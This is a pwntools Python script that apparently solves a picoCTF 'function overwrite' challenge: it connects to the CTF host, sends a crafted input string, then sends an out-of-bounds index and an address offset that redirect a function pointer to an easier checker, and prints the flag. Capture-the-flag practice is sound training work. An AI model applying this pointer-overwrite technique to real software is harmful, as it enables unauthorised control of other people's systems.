# picoCTF-function-overwrite-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 62532
    
    # variables
    easy_checker_addr = 0x80492fc
    hard_checker_addr = 0x8049436
    check_addr = 0x804c040
    fun_addr = 0x804c080
    story = "\x7f" * 10 + "\x43"                    # shortest amount of characters whose sum = 1337
    num1 = (int) ((check_addr - fun_addr) / 4)      # number that becomes index in fun which leads to check
    num2 = easy_checker_addr - hard_checker_addr    # number that is added to check to change the function to easy_checker

    # connect to instance and deliver payload
    p = remote(host, port)

    # send story
    p.recvuntil(b">> ", timeout=1)
    p.sendline(story.encode())

    # put in two numbers
    p.recvline(timeout=1)
    p.sendline(f"{num1} {num2}".encode())

    # retrieve flag
    p.recvline(timeout=1)
    flag = p.recvline(timeout=1).decode().rstrip("\n")
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()